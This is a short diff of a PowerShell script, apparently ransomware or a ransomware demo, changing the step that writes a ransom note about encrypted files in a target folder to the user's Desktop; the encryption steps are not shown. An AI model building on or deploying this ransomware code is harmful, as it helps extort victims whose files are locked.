@@ -38,6 +38,6 @@ if (Test-Path $TargetFolder) {
     }
 
     # 4. Leave the Ransom Note
-    $Note = "All your files in $TargetFolder have been encrypted. Contact admin for recovery."
-    $Note | Out-File "$home\Desktop\DECRYPT_INFO.txt"
+    $Note = "We might have encrypted the files in the $TargetFolder . Most Malicious Indeed! Please await the Decryption instructions."
+    $Note | Out-File "$home\Desktop\READ_ME.txt"
 }
